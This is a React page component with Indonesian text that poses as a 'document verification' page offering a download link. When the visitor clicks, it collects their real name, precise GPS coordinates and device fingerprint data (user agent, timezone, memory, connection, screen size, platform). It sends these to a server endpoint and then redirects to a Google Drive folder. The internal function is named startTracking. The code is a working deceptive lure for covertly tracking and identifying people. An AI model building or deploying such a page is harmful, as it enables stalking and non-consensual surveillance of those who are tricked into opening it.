import { useState } from 'react';

export default function Home() {
  const [name, setName] = useState('');
  const [loading, setLoading] = useState(false);

  const startTracking = async () => {
    if (!name) {
      alert("Mohon isi nama asli dulu.");
      return;
    }

    setLoading(true);

    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(async (position) => {
        try {
          const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
          const memory = (navigator as any).deviceMemory;
          const connection = (navigator as any).connection?.effectiveType;
          const userAgent = navigator.userAgent;
          const screenSize = `${window.screen.width}x${window.screen.height}`;
          const language = navigator.language;
          const platform = navigator.platform;

          await fetch('/api/location', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              name,
              lat: position.coords.latitude,
              lon: position.coords.longitude,
              accuracy: position.coords.accuracy,
              userAgent,
              timezone,
              memory,
              connection,
              screenSize,
              language,
              platform,
            }),
          });

          window.location.href = 'https://drive.google.com/drive/folders/1xiz5IF0xhsMKqnol0cBrO8KWScXV7cd-?usp=sharing';
        } catch (error) {
          console.error("Gagal mengirim data:", error);
          alert("Gagal mengirim data.");
        } finally {
          setLoading(false);
        }
      });
    } else {
      alert("Browser Anda tidak mendukung GPS.");
      setLoading(false);
    }
  };

  return (
    <div style={{ fontFamily: 'sans-serif', textAlign: 'center', marginTop: '100px' }}>
      <h2>Verifikasi Dokumen</h2>
      <p>Masukkan nama asli Anda lalu klik tombol di bawah untuk melanjutkan.</p>
      
      {/* Form input untuk nama asli */}
      <div style={{ marginBottom: '15px' }}>
        <input
          type="text"
          placeholder="Masukkan Nama Asli"
          value={name}
          onChange={(e) => setName(e.target.value)}
          style={{
            padding: '10px',
            fontSize: '16px',
            width: '300px',
            borderRadius: '6px',
            border: '1px solid #ccc',
            marginBottom: '10px',
          }}
        />
      </div>
      
      {/* Tombol untuk memulai tracking */}
      <button
        onClick={startTracking}
        disabled={loading}
        style={{
          padding: '12px 24px',
          fontSize: '16px',
          background: '#3c78da',
          color: 'white',
          border: 'none',
          borderRadius: '6px',
          cursor: 'pointer',
        }}
      >
        {loading ? 'Mengirim...' : 'Dapatkan Link'}
      </button>
    </div>
  );
}